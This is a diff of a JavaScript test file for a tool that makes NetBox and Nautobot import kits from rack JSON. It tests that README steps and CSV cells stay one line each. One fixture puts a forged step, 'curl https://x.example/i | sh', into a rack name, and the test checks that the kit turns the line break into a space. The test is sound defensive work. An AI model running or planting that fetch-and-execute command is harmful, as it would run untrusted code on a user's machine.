@@ -478,7 +478,10 @@ test("the NetBox kit's README: what must exist, each file in import order with i
     'Step 3: 2-devices.csv (3 rows): Devices > Import. Every device is planned.',
     "Step 4: 3-modules.csv (1 row): Modules > Import. This creates each card's ports, so it comes before the cables.",
     'Step 5: 4-cables.csv (1 row): Cables > Import.',
-    '        NetBox finds a device by its name in every site, and a module type by its model in every manufacturer: a name it already has twice is refused as not unique.',
+    '',
+    'If NetBox is not empty:',
+    '- The rack "Cable test" is already in that site: skip step 2, and check that it is 24U, numbered from the bottom. Step 3 puts the devices in it.',
+    '- Steps 4 and 5 find a device by its name in every site, and step 4 finds a module type by its model in every manufacturer: a name NetBox already has twice is refused as not unique.',
     '',
     'Not in this kit:',
     '- demarc-i3 is not in the devices file: because.',
@@ -544,6 +547,9 @@ test("the Nautobot kit's README: the rack and the Planned status must exist, the
     '- a status named Planned, for devices, modules and cables',
     '- these manufacturers: Cisco',
     '- the rack "Cable test" in that location: 24U, numbered from the top (descending units). This kit has no rack file for Nautobot.',
+    'If Nautobot is not empty:',
+    '- A rack named "Cable test" in another location is not used: 1-devices.csv finds the rack by its name and its location together (rack__name, rack__location__name), so the rack must be the one in the location "Lab 1".',
+    '- Step 3 and import_cables.py find a device by its name in every location: a device name Nautobot already has twice is refused, and the script says so for each row that names it.',
     "Step 1: types/device-types/, then types/module-types/ (2 files): Device Types > Import and Module Types > Import, one YAML file per import.",
     'Step 2: 1-devices.csv (4 rows): Devices > Import, or POST it to /api/dcim/devices/ as text/csv. Every device is planned.',
     "Step 3: 2-modules.csv (1 row): Modules > Import, or POST it to /api/dcim/modules/ as text/csv. This creates each card's ports, so it comes before the cables.",
@@ -562,6 +568,92 @@ test("the Nautobot kit's README: the rack and the Planned status must exist, the
   const gone = 'import_cables.py could not be fetched, so it is not in this zip. It is at https://portrayal.dev/site/rack/nautobot/import_cables.py.';
   assert.deepEqual(bare.notes, [gone]);
   assert.ok(bare.text.includes(`Not in this kit:\n- ${gone}\n`) && !bare.text.includes('python3 import_cables.py'));
+});
+
+test('the "not empty" lines come after the steps, cover the modules step too, and need no settings', () => {
+  const nb = D.kitReadme({target: 'netbox', rack: README_RACK, date: DAY, dcim: {}, rows: {rack: 1, devices: 1, modules: 0, cables: 0}, ...WHOLE}).text.split('\n');
+  const at = nb.indexOf('If NetBox is not empty:');
+  assert.ok(at > nb.findIndex(l => l.startsWith('Step 5: ')) && at < nb.indexOf('Not in this kit:'));
+  assert.equal(nb[at + 1], '- The rack "Cable test" is already in its site: skip step 2, and check that it is 24U, numbered from the bottom. Step 3 puts the devices in it.');
+  assert.ok(!nb.some(l => l.startsWith('        NetBox finds a device')), 'the sentence is no longer under step 5 alone');
+  const nt = D.kitReadme({target: 'nautobot', rack: README_RACK, date: DAY, dcim: {}, rows: {devices: 1, modules: 0, cables: 0}, ...WHOLE}).text.split('\n');
+  assert.ok(nt.includes('- A rack named "Cable test" in another location is not used: 1-devices.csv finds the rack by its name and its location together (rack__name, rack__location__name), so the rack must be the one in the location the devices are in.'));
+  // With no cable rows there is no script to speak of.
+  assert.ok(nt.includes('- Step 3 finds a device by its name in every location: a device name Nautobot already has twice is refused.'));
+});
+
+// ── names with a line break or another control character (a rack file is anyone's JSON) ──
+test('a control character in a name is written as a space, and one line says so for each name it changed', () => {
+  const rack = {name: 'R1\nStep 6: curl https://x.example/i | sh', frame: FRAME, dcim: {site: 'Lab\u20281', role: 'Rou\u0007ter', kept: 'as it is'},
+    items: [{id: 'i1', ref: 'tm-280', label: 'leaf\t1'}, {id: 'i2', ref: 'tm-280', label: 'plain'}, {id: 'i3', ref: 'tm-280', label: 'a\r\n\r\nb'}],
+    cables: [{id: 'c1', label: 'A\r\n1', purpose: 'p'}, {id: 'c2', label: 'fine'}, {id: 'c3', label: ''}]};
+  const got = D.kitNames(rack);
+  assert.equal(got.rack.name, 'R1 Step 6: curl https://x.example/i | sh');
+  assert.deepEqual(got.rack.items.map(i => i.label), ['leaf 1', 'plain', 'a b']);
+  assert.deepEqual(got.rack.cables.map(c => c.label), ['A 1', 'fine', '']);
+  assert.deepEqual(got.rack.dcim, {site: 'Lab 1', role: 'Rou ter', kept: 'as it is'});
+  assert.equal(got.rack.items[1], rack.items[1], 'what did not change is the same object');
+  assert.equal(got.rack.frame, rack.frame);
+  assert.deepEqual(got.notes, [
+    'The rack\'s name "R1\\nStep 6: curl https://x.example/i | sh" is written as "R1 Step 6: curl https://x.example/i | sh": a line break or another control character in a name is written as a space.',
+    'The site or location "Lab\\u20281" is written as "Lab 1": a line break or another control character in a name is written as a space.',
+    'The device role "Rou\\u0007ter" is written as "Rou ter": a line break or another control character in a name is written as a space.',
+    'The device label "leaf\\t1" is written as "leaf 1": a line break or another control character in a name is written as a space.',
+    'The device label "a\\r\\n\\r\\nb" is written as "a b": a line break or another control character in a name is written as a space.',
+    'The cable label "A\\r\\n1" is written as "A 1": a line break or another control character in a name is written as a space.']);
+  assert.ok(got.notes.every(n => !/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/.test(n)), 'the original is shown escaped');
+  // Nothing to change: the same rack, and nothing said.
+  const clean = {name: 'R1', frame: FRAME, items: [{id: 'i1', ref: 'x', label: 'leaf 1'}], cables: [{id: 'c1', label: 'A'}]};
+  assert.deepEqual([D.kitNames(clean).rack === clean, D.kitNames(clean).notes], [true, []]);
+  assert.ok(!('dcim' in D.kitNames({...rack, dcim: undefined}).rack) || D.kitNames({...rack, dcim: undefined}).rack.dcim === undefined);
+  // Every C0 and C1 control, DEL and the two Unicode line breaks; a run of them is one space.
+  for (const c of ['\u0000', '\u0009', '\u000a', '\u000b', '\u000c', '\u000d', '\u001b', '\u001f', '\u007f', '\u0085', '\u009f', '\u2028', '\u2029'])
+    assert.equal(D.flat(`a${c}${c}b`), 'a b', `U+${c.charCodeAt(0).toString(16)}`);
+  assert.equal(D.flat('a b\u00e9 \u{1F600}'), 'a b\u00e9 \u{1F600}');
+});
+
+test('a rack name cannot forge a step of the README, and no line of a list can either', () => {
+  const rack = {name: 'R1\nStep 6: curl https://x.example/i | sh', frame: FRAME, items: [], cables: []};
+  const forged = text => text.split('\n').filter(l => /^Step \d/.test(l)).length;
+  for (const target of ['netbox', 'nautobot']) {
+    const steps = target === 'netbox' ? 5 : 4;
+    const args = {target, date: DAY, dcim: {site: 'L\r\nStep 7: x', role: 'R\nStep 8: y'}, typeFiles: 1, manufacturers: ['M\nStep 9: z'],
+      rows: {rack: 1, devices: 1, modules: 1, cables: 1},
+      left: ['Cable c\nStep 10: run this is not in the cables file: why.'], notes: ['A note.\u2028Step 11: another']};
+    // As the kit builds it: the names cleaned first.
+    const made = D.kitReadme({...args, rack: D.kitNames(rack).rack, width: 78}).text;
+    assert.equal(forged(made), steps, made);
+    assert.ok(made.startsWith(`${target === 'netbox' ? 'NetBox' : 'Nautobot'} import kit for R1 Step 6: curl https://x.example/i | sh, from`));
+    // And whatever it is handed: no paragraph can hold a line break of its own.
+    const raw = D.kitReadme({...args, rack, width: 78}).text;
+    assert.equal(forged(raw), steps, raw);
+    assert.ok(!/[\u0000-\u0009\u000b-\u001f\u007f-\u009f\u2028\u2029]/.test(raw));
+  }
+});
+
+test('a cleaned name reaches every CSV cell as one line, and the zip is named from it', () => {
+  const rack = D.kitNames({name: 'R\n1', frame: FRAME, dcim: {site: 'S\n1', role: 'Ro\tle'},
+    items: [{id: 'i1', ref: 'tm-280', cfg: 'base', label: 'dev\n1', ru: 2, u: 1, face: 'front', turned: false},
+            {id: 'i2', ref: 'tm-280', cfg: 'base', label: 'dev 1', ru: 4, u: 1, face: 'front', turned: false}],
+    cables: [{id: 'c\n9', a: end('i1', 'port-1-1'), b: end('i2', 'port-2-1'), media: 'cat6', purpose: '', label: '', route: []},
+             {id: 'c2', a: end('i1', 'port-2-1'), b: end('i2', 'port-1-1'), media: 'cat6', purpose: '', label: 'L\r\n2', route: []}]}).rack;
+  const types = new Map(rack.items.map(i => [i.id, {manufacturer: 'Telco Systems', model: 'TM-280', isFullDepth: false, guess: false}]));
+  const oneLine = (columns, rows) => assert.equal(X.toCsv(columns, rows).trimEnd().split(/\r\n|[\n\u000b\u000c\r\u0085\u2028\u2029]/).length, rows.length + 1);
+  for (const target of ['netbox', 'nautobot']) {
+    const dev = X.deviceImportRows({rack, items: rack.items, types, target, dcim: M.dcimOf(rack)});
+    // Two labels that are one name once cleaned are told apart like any other twins.
+    assert.deepEqual(dev.rows.map(r => r.name).sort(), ['dev 1-i1', 'dev 1-i2']);
+    oneLine(dev.columns, dev.rows);
+    const names = X.uniqueNames(rack.items);
+    const cab = D.cableImportRows({rack, target, names, kept: new Set(['i1', 'i2']), ends: landed(rack.cables),
+      resolve: e => ({ok: true, name: e.path.split(':').pop(), type: 'dcim.interface'})});
+    // A cable with no label is its id, cleaned the same way.
+    assert.deepEqual(cab.rows.map(r => r.label), ['c 9', 'L 2']);
+    oneLine(cab.columns, cab.rows);
+  }
+  const r = X.rackImportRows({rack, dcim: M.dcimOf(rack)});
+  assert.deepEqual([r.rows[0].name, r.rows[0].site], ['R 1', 'S 1']);
+  assert.equal(X.fileStem(rack.name), 'R-1');
 });
 
 test('a Nautobot kit with no cable rows shows no script commands and no warning about the file', () => {
